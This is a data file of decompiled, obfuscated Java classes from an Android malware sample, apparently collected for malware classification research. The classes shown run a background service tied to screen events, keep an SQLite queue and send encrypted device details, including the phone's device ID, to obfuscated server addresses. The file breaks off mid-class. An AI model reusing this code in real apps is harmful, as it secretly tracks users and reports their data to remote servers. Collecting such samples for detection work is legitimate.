"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\z.code","public class z extends Handler {   final Context f213a;   final boolean b;   final y c;   public z(  y yVar,  Context context,  boolean z){     this.c=yVar;     this.f213a=context;     this.b=z;   }   @Override public void handleMessage(  Message message){     String str;     long j;     super.handleMessage(message);     com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f213a,this.b);     if (!this.b) {       com.apkmore.rbjatnldymzfiw.v.e.h.j(this.f213a,com.apkmore.rbjatnldymzfiw.v.e.h.o(this.f213a));     }     long time=new Date().getTime();     long d=com.apkmore.rbjatnldymzfiw.v.e.h.d();     this.c.c=com.apkmore.rbjatnldymzfiw.v.e.h.b(this.f213a);     str=this.c.c;     if (str.equals(com.apkmore.rbjatnldymzfiw.v.e.b.aH)) {       d.a(this.f213a).a(1);       return;     }     long j2=time - d;     j=this.c.b;     if (j2 <= j && d != 60) {       Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.aO);     }  else {       d.a(this.f213a).a(1);       com.apkmore.rbjatnldymzfiw.v.e.h.a(time);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\Zh.code","public class Zh extends Service {   private Context f140a;   private ac c;   private Looper d;   private PowerManager f;   private boolean b=false;   private boolean e=true;   public void a(){     String[] q=com.apkmore.rbjatnldymzfiw.v.e.h.q(this.f140a);     String str=q[0];     String str2=q[1];     boolean booleanValue=Boolean.valueOf(q[2]).booleanValue();     if (this.b && !booleanValue) {       com.apkmore.rbjatnldymzfiw.v.e.h.j(this.f140a,str);       new Handler().postDelayed(new ab(this),10000L);       this.b=false;     }     if (booleanValue) {       this.b=true;     }   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();     this.f140a=getApplicationContext();     IntentFilter intentFilter=new IntentFilter();     intentFilter.addAction(""android.intent.action.SCREEN_OFF"");     intentFilter.addAction(""android.intent.action.SCREEN_ON"");     try {       this.f140a.registerReceiver((BroadcastReceiver)com.apkmore.rbjatnldymzfiw.v.e.h.b(this.f140a,Vokj.class).newInstance(),intentFilter);     }  catch (    IllegalAccessException e) {       e.printStackTrace();     } catch (    InstantiationException e2) {       e2.printStackTrace();     }     Context context=this.f140a;     Context context2=this.f140a;     this.f=(PowerManager)context.getSystemService(""power"");     HandlerThread handlerThread=new HandlerThread(com.apkmore.rbjatnldymzfiw.v.e.b.bH,10);     handlerThread.start();     this.d=handlerThread.getLooper();     this.c=new ac(this,this.d);   }   @Override public void onDestroy(){     super.onDestroy();     this.e=false;   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     if (this.f.isScreenOn()) {       this.c.sendEmptyMessage(0);       return 1;     }     this.f140a.stopService(new Intent(this.f140a,(Class<?>)Vokj.a(this.f140a)));     return 1;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\a.code","public class a {   public void a(  String str,  String str2,  Handler handler){     new Thread(new b(this,str,str2,handler)).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\b.code","public class b implements Runnable {   final String f142a;   final String b;   final Handler c;   final a d;   public b(  a aVar,  String str,  String str2,  Handler handler){     this.d=aVar;     this.f142a=str;     this.b=str2;     this.c=handler;   }   @Override public void run(){     try {       com.apkmore.rbjatnldymzfiw.v.e.h.c(this.f142a,this.b);       this.c.sendEmptyMessage(0);     }  catch (    IOException e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\c.code","public interface c {   void a(  h hVar,  int i);   void a(  h hVar,  long j); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@36d8eac2"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\e.code","class e {   public String f144a;   public String b;   public int c;   public int d=-1;   public int e;   public String f;   public String g;   public int h;   public String i;   public long j;   public String toString(){     return ""["" + this.f144a + "" ""+ this.b+ "" ""+ this.e+ "" ""+ this.c+ "" ""+ this.d+ ""  ""+ this.f+ ""  ""+ this.g+ "" ""+ this.i+ "" ""+ this.j+ ""]"";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\f.code","class f {   private g f145a;   public f(  Context context){     this.f145a=new g(context);   }   public List a(){     ArrayList arrayList=new ArrayList();     SQLiteDatabase readableDatabase=this.f145a.getReadableDatabase();     Cursor query=readableDatabase.query(com.apkmore.rbjatnldymzfiw.v.e.b.p,null,null,null,null,null,null);     while (query.moveToNext()) {       e eVar=new e();       eVar.f144a=query.getString(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.r));       eVar.b=query.getString(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.s));       eVar.c=query.getInt(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.t));       eVar.d=query.getInt(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.u));       eVar.e=query.getInt(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.v));       eVar.f=query.getString(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.x));       eVar.g=query.getString(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.w));       eVar.h=query.getInt(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.y));       eVar.i=query.getString(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.z));       eVar.j=query.getLong(query.getColumnIndex(com.apkmore.rbjatnldymzfiw.v.e.b.A));       arrayList.add(eVar);     }     query.close();     readableDatabase.close();     return arrayList;   }   public synchronized void a(  e eVar){     SQLiteDatabase writableDatabase=this.f145a.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.r,eVar.f144a);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.s,eVar.b);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.t,Integer.valueOf(eVar.c));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.u,Integer.valueOf(eVar.d));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.v,Integer.valueOf(eVar.e));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.x,eVar.f);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.w,eVar.g);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.y,Integer.valueOf(eVar.h));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.z,eVar.i);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.A,Long.valueOf(eVar.j));     writableDatabase.insert(com.apkmore.rbjatnldymzfiw.v.e.b.p,null,contentValues);     writableDatabase.close();   }   public void b(  e eVar){     SQLiteDatabase writableDatabase=this.f145a.getWritableDatabase();     writableDatabase.delete(com.apkmore.rbjatnldymzfiw.v.e.b.p,com.apkmore.rbjatnldymzfiw.v.e.b.r + "" = ? and "" + com.apkmore.rbjatnldymzfiw.v.e.b.bI+ "" = ?"",new String[]{eVar.f144a,eVar.b});     writableDatabase.close();   }   public synchronized void c(  e eVar){     SQLiteDatabase writableDatabase=this.f145a.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.r,eVar.f144a);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.s,eVar.b);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.t,Integer.valueOf(eVar.c));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.u,Integer.valueOf(eVar.d));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.v,Integer.valueOf(eVar.e));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.x,eVar.f);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.w,eVar.g);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.y,Integer.valueOf(eVar.h));     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.z,eVar.i);     contentValues.put(com.apkmore.rbjatnldymzfiw.v.e.b.A,Long.valueOf(eVar.j));     writableDatabase.update(com.apkmore.rbjatnldymzfiw.v.e.b.p,contentValues,com.apkmore.rbjatnldymzfiw.v.e.b.r + "" = ? and "" + com.apkmore.rbjatnldymzfiw.v.e.b.bI+ "" = ?"",new String[]{eVar.f144a,eVar.b});     writableDatabase.close();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\g.code","class g extends SQLiteOpenHelper {   public g(  Context context){     super(context,com.apkmore.rbjatnldymzfiw.v.e.b.o,(SQLiteDatabase.CursorFactory)null,5);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.v.e.b.cd + "" "" + com.apkmore.rbjatnldymzfiw.v.e.b.ca+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.p+ "" (""+ com.apkmore.rbjatnldymzfiw.v.e.b.q+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bV+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bT+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bS+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.r+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bU+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.s+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bU+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.t+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bV+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.u+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bV+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.v+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bV+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.x+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bU+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.w+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bU+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.y+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bV+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.z+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bU+ "",""+ com.apkmore.rbjatnldymzfiw.v.e.b.A+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bW+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.bX+ "" ""+ System.currentTimeMillis()+ com.apkmore.rbjatnldymzfiw.v.e.b.bY);   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.v.e.b.bZ + "" "" + com.apkmore.rbjatnldymzfiw.v.e.b.ca+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.cb+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.cc+ "" ""+ com.apkmore.rbjatnldymzfiw.v.e.b.p);     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.a\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5a680f97"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\a.code","public class a {   private static a f150a=null;   private a(){   }   public static a a(){     if (f150a == null) {       f150a=new a();     }     return f150a;   }   public void a(  Context context,  int i,  int i2){     new b(this,context,i,i2).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\b.code","public class b extends AsyncTask {   final a f151a;   private StringBuffer b;   private Context c;   private int d;   private int e;   public b(  a aVar,  Context context,  int i,  int i2){     this.f151a=aVar;     this.c=context;     this.d=i;     this.e=i2;   }   @Override public i doInBackground(  Void... voidArr){     d a2=d.a(this.c);     this.b=new StringBuffer();     String g=com.apkmore.rbjatnldymzfiw.v.e.h.g(this.c);     if (!"""".equals(g)) {       this.b.append(g);       this.b.append("";"");     }     this.b.append(this.d);     this.b.append("","");     this.b.append(this.e);     i a3=a2.a(this.b.toString());     if (a3 != null) {     }     return a3;   }   @Override public void onPostExecute(  i iVar){     super.onPostExecute(iVar);     if (iVar == null || !(iVar == null || iVar.f156a == 0)) {       com.apkmore.rbjatnldymzfiw.v.e.h.d(this.c,this.b == null ? null : this.b.toString());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\c.code","public class c {   public static int f152a=-1;   private static c b;   private Context c;   private h d;   private c(  Context context){     this.c=context;     this.d=new h(context);     Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.c + "":"" + this.d.o);     Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.d + "":"" + this.d.n);     if (this.d.r != 100061) {     }   }   public static c a(  Context context){     if (b == null) {       b=new c(context.getApplicationContext());     }     return b;   }   private InputStream a(  String str,  String str2){     HttpClient a2;     HttpResponse execute;     int statusCode;     if (str2 != null && (a2=com.apkmore.rbjatnldymzfiw.v.n.a(this.c)) != null) {       String str3="""";       try {         str3=com.apkmore.rbjatnldymzfiw.v.e.c.a(com.apkmore.rbjatnldymzfiw.v.e.b.B + com.apkmore.rbjatnldymzfiw.v.e.b.B,str2);       }  catch (      Exception e) {         e.printStackTrace();       }       byte[] bytes=str3.getBytes();       HttpPost httpPost=new HttpPost(str);       if (bytes != null) {         httpPost.setEntity(new ByteArrayEntity(bytes));       }       int i=0;       while (true) {         int i2=i;         if (i2 >= 2) {           return null;         }         try {           execute=a2.execute(httpPost);           statusCode=execute.getStatusLine().getStatusCode();           Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.ab + "":"" + statusCode);         }  catch (        ClientProtocolException e2) {           e2.printStackTrace();         } catch (        IOException e3) {           e3.printStackTrace();         } catch (        OutOfMemoryError e4) {           e4.printStackTrace();         }         if (String.valueOf(statusCode).startsWith(""2"")) {           return a(execute);         }         continue;         i=i2 + 1;       }     }     return null;   }   private InputStream a(  HttpResponse httpResponse){     return httpResponse.getEntity().getContent();   }   private String a(  InputStream inputStream){     BufferedReader bufferedReader;     Throwable th;     String str=null;     if (inputStream != null) {       StringBuilder sb=new StringBuilder();       try {         bufferedReader=new BufferedReader(new InputStreamReader(inputStream));         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }  catch (          Exception e) {             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             return str;           } catch (          Throwable th2) {             th=th2;             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             throw th;           }         }         str=com.apkmore.rbjatnldymzfiw.v.e.c.b(com.apkmore.rbjatnldymzfiw.v.e.b.B + com.apkmore.rbjatnldymzfiw.v.e.b.B,sb.toString());         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }       }  catch (      Exception e8) {         bufferedReader=null;       } catch (      Throwable th3) {         bufferedReader=null;         th=th3;       }     }     return str;   }   private String a(  HashMap hashMap){     String str=com.apkmore.rbjatnldymzfiw.v.e.b.aF;     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   public f[] a(  String str){     HashMap hashMap=new HashMap();     hashMap.put(com.apkmore.rbjatnldymzfiw.v.e.b.Z,""0"");     if (f152a > -1) {       hashMap.put(com.apkmore.rbjatnldymzfiw.v.e.b.aa,"""" + f152a);       f152a=-1;     }     this.d.q=str;     this.d.t=com.apkmore.rbjatnldymzfiw.v.e.h.n(this.c);     this.d.u=com.apkmore.rbjatnldymzfiw.v.e.h.k(this.c,com.apkmore.rbjatnldymzfiw.v.e.h.n(this.c)) ? 1 : 0;     this.d.v=com.apkmore.rbjatnldymzfiw.v.e.h.p(this.c);     InputStream a2=a(a(hashMap),this.d.b().toString());     if (a2 == null) {       com.apkmore.rbjatnldymzfiw.v.e.h.e(this.c,str);       return null;     }     String a3=a(a2);     if (a3 == null) {       return null;     }     i iVar=(i)s.a(i.class,a3);     if (iVar != null) {       if (iVar != null) {       }       return (f[])s.b(f.class,a3);     }     com.apkmore.rbjatnldymzfiw.v.e.h.e(this.c,str);     return null;   }   public i b(  String str){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(com.apkmore.rbjatnldymzfiw.v.e.b.Z,""1"");     String a3=a(hashMap);     this.d.q=str;     InputStream a4=a(a3,this.d.b().toString());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     return (i)s.a(i.class,a2);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\d.code","public class d {   private static d f153a=null;   private l b;   private Context c;   private d(  Context context){     this.c=context;   }   public static d a(  Context context){     if (f153a == null) {       f153a=new d(context.getApplicationContext());     }     return f153a;   }   private InputStream a(  HttpResponse httpResponse){     return httpResponse.getEntity().getContent();   }   private String a(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(this.b.a(),this.b.b());       return jSONObject.toString();     }  catch (    JSONException e) {       e.printStackTrace();       return null;     }   }   private String a(  InputStream inputStream){     BufferedReader bufferedReader;     Throwable th;     String str=null;     if (inputStream != null) {       StringBuilder sb=new StringBuilder();       try {         bufferedReader=new BufferedReader(new InputStreamReader(inputStream));         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }  catch (          Exception e) {             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             return str;           } catch (          Throwable th2) {             th=th2;             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             throw th;           }         }         str=sb.toString();         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }       }  catch (      Exception e8) {         bufferedReader=null;       } catch (      Throwable th3) {         bufferedReader=null;         th=th3;       }     }     return str;   }   private String a(  HashMap hashMap){     String str=com.apkmore.rbjatnldymzfiw.v.e.b.aG;     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   private InputStream b(  String str,  String str2){     HttpClient a2;     HttpResponse execute;     InputStream inputStream=null;     if (str2 != null && (a2=com.apkmore.rbjatnldymzfiw.v.n.a(this.c)) != null) {       byte[] bytes=str2.getBytes();       HttpPost httpPost=new HttpPost(str);       if (bytes != null) {         httpPost.setEntity(new ByteArrayEntity(bytes));       }       int i=0;       while (true) {         int i2=i;         if (i2 >= 2) {           break;         }         try {           execute=a2.execute(httpPost);         }  catch (        OutOfMemoryError e) {           e.getMessage();         } catch (        ClientProtocolException e2) {           e2.getMessage();         } catch (        IOException e3) {           e3.getMessage();         }         if (String.valueOf(execute.getStatusLine().getStatusCode()).startsWith(""2"")) {           inputStream=a(execute);           break;         }         continue;         i=i2 + 1;       }     }     return inputStream;   }   public i a(  String str){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(com.apkmore.rbjatnldymzfiw.v.e.b.Z,""1"");     String a3=a(hashMap);     this.b.r=str;     InputStream b=b(a3,a());     if (b == null || (a2=a(b)) == null) {       return null;     }     return (i)s.a(i.class,a2);   }   public HashMap a(  String str,  String str2){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(com.apkmore.rbjatnldymzfiw.v.e.b.Z,""0"");     String a3=a(hashMap);     this.b=new l(this.c);     this.b.r=str2;     this.b.t=str;     InputStream b=b(a3,a());     if (b == null || (a2=a(b)) == null) {       return null;     }     HashMap hashMap2=new HashMap();     i iVar=(i)s.a(i.class,a2);     k[] kVarArr=(k[])s.b(k.class,a2);     if (kVarArr != null) {     }     hashMap2.put(i.class.getName(),iVar);     hashMap2.put(k.class.getName(),kVarArr);     return hashMap2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\e.code","public class e { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\f.code","public class f implements g {   public String f154a;   public String b;   public int c;   public String d;   public int e;   public String f;   public String g;   public String h;   public int i;   public String j;   public String k;   public String l;   public String m;   public String n;   public String o;   public int p;   public int q;   public String r;   public int s=0;   public int t=120000;   public boolean u=false;   public boolean v=false;   public boolean w=false;   public int x=-1;   public int y=0;   @Override public String a(){     return ""b"";   }   @Override public void a(  JSONObject jSONObject){     if (jSONObject == null) {       return;     }     try {       this.f154a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.d=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.e=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.f=jSONObject.isNull(""f"") ? null : jSONObject.getString(""f"");       this.g=jSONObject.isNull(""g"") ? null : jSONObject.getString(""g"");       this.h=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.i=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? null : jSONObject.getString(""j"");       this.k=jSONObject.isNull(""k"") ? null : jSONObject.getString(""k"");       this.l=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.m=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.n=jSONObject.isNull(""n"") ? """" : jSONObject.getString(""n"");       this.o=jSONObject.isNull(""o"") ? """" : jSONObject.getString(""o"");       this.p=jSONObject.isNull(""p"") ? -1 : jSONObject.getInt(""p"");       this.q=jSONObject.isNull(""q"") ? -1 : jSONObject.getInt(""q"");       this.r=jSONObject.isNull(""r"") ? """" : jSONObject.getString(""r"");       this.s=jSONObject.isNull(""s"") ? 0 : jSONObject.getInt(""s"");       this.t=jSONObject.isNull(""t"") ? 0 : jSONObject.getInt(""t"");     }  catch (    Exception e) {       e.printStackTrace();     }   }   public boolean a(  String str){     String[] a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(str,com.apkmore.rbjatnldymzfiw.v.e.b.aP);     if (a2 == null) {       return false;     }     try {       this.f154a=a2[0];       this.b=a2[1];       this.c=Byte.valueOf(a2[2]).byteValue();       this.d=a2[3];       this.e=Integer.valueOf(a2[4]).intValue();       this.f=a2[5];       this.g=a2[6];       this.h=a2[7];       this.i=Integer.valueOf(a2[8]).intValue();       this.j=a2[9];       this.k=a2[10];       this.l=a2[11];       this.m=a2[12];       this.n=a2[13];       this.o=a2[14];       this.p=Integer.valueOf(a2[15]).intValue();       this.q=Integer.valueOf(a2[16]).intValue();       this.r=a2[17];       this.x=Integer.valueOf(a2[18]).intValue();       this.y=Integer.valueOf(a2[19]).intValue();       this.s=Integer.valueOf(a2[20]).intValue();       this.t=Integer.valueOf(a2[21]).intValue();       return true;     }  catch (    Exception e) {       return false;     }   }   public String b(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(this.f154a);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.b);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.c);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.d);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.e);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.f);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.g);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.h);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.i);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.j);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.k);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.l);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.m);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.n);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.o);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.p);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.q);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.r);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.x);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.y);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.s);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     stringBuffer.append(this.t);     stringBuffer.append(com.apkmore.rbjatnldymzfiw.v.e.b.aP);     return stringBuffer.toString();   }   public String toString(){     return """";   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\g.code","interface g {   String a();   void a(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v.b\h.code","public class h implements g {   public static String s=""1.0.8"";   public String f155a;   public String b;   public String c;   public String d;   public String e;   public int f;   public int g;   public int h;   public int i;   public double j;   public double k;   public String l;   public String m;   public String n;   public String o;   public String p;   public String q;   public int r;   public String t;   public int u;   public int v;   public h(  Context context){     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     this.c=com.apkmore.rbjatnldymzfiw.v.e.h.a(context);     this.d=telephonyManager.getDeviceId();     this.o=com.apkmore.rbjatnldymzfiw.v.e.h.b(context);     this.b=Build.PRODUCT;     this.f155a=Build.VERSION.SDK;     this.p=context.getPackageName();     this.r=com.apkmore.rbjatnldymzfiw.v.e.h.c(context);     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics 